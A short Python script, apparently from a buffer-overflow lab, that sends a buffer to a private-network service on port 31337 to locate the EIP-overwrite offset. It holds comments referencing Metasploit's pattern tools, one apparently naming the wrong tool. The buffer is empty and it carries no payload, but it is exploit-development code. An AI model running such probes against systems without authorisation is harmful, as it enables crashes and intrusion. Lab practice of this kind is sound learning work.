#!/usr/bin/python3
# Locate the bytes that override the EIP

import socket, time

host = '192.168.56.101'
port = 31337

def send_buffer(buffer):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Sending " + str(len(buffer)) + " bytes buffer")
    connect = s.connect((host, port))
    s.send(buffer + b"\r\n")
    print("Buffer sent")
    s.close()
    time.sleep(0)

# /opt/metasploit/tools/exploit/pattern_create.rb -l $SIZE
# /opt/metasploit/tools/exploit/pattern_create.rb -l $SIZE -q $EIP
buffer = b''
send_buffer(buffer)
print("Done")
